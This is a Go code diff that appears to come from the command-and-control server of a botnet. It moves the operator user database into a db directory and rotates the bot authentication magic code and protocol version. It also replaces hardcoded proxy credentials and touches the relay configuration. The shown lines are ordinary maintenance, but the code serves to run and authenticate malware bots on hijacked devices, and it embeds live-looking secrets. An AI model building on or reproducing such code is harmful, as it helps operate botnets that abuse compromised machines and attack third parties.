@@ -12,22 +12,20 @@ import (
 	"time"
 )
 
-// usersFile is resolved at init to support running from project root or cnc dir
+// usersFile is resolved at init to support running from project root or cnc dir.
+// Canonical location is cnc/db/users.json; falls back to legacy paths for migration.
 var usersFile string
 
 func init() {
-	for _, path := range []string{"cnc/users.json", "users.json"} {
+	// Check legacy locations first so existing deployments migrate automatically
+	for _, path := range []string{"cnc/db/users.json", "cnc/users.json", "users.json"} {
 		if _, err := os.Stat(path); err == nil {
 			usersFile = path
 			return
 		}
 	}
-	// Default — will be created on first run
-	if _, err := os.Stat("cnc"); err == nil {
-		usersFile = "cnc/users.json"
-	} else {
-		usersFile = "users.json"
-	}
+	// Default for new installs — db/ directory
+	usersFile = dbPath("users.json")
 }
 
 const (
@@ -42,12 +40,12 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "4J*sgOVnQuQ@TpvT"
-	PROTOCOL_VERSION = "r3.7-stable"
+	MAGIC_CODE       = "McDPahp5&tAo$F1y"
+	PROTOCOL_VERSION = "r4.6-stable"
 )
 
-var bakedProxyUser = "COGXeSPF3zja" // change me run setup.py
-var bakedProxyPass = "EJQE1vd8bpaB" // change me run setup.py
+var bakedProxyUser = "7emOZVbqgcAC" // change me run setup.py
+var bakedProxyPass = "BUdiLg8CT4Nt" // change me run setup.py
 
 // RelayEntry represents a relay in relays.json.
 type RelayEntry struct {
